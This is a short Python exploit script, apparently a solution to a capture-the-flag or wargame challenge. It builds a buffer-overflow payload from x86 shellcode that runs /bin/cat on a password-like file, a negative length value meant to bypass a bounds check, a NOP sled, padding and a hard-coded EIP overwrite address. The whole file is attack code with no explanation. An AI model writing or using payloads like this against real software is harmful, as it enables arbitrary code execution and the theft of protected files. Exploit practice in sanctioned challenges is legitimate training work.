import struct
  
# custom shellcode from challenge 08 (catpw.s)
shellcode = b'j\x0bX1\xd2\xbb\xaaswd\xc1\xeb\x08Sh.pas\x89\xe1Rh/cath/bin\x89\xe3RQS\x89\xe1\xcd\x80'

s = b''
s += struct.pack("<i", -1) # -1 makes loop ignore bounds
s += b'/' + shellcode.rjust(128, b'\x90')

s += b'AAAABBBBCCCCDDDDEEEEFFFFGGGG'

# eip
s += struct.pack("<I", 0xbffffaf2)

# with open('data', 'wb') as f:
#     f.write(s)
print(s)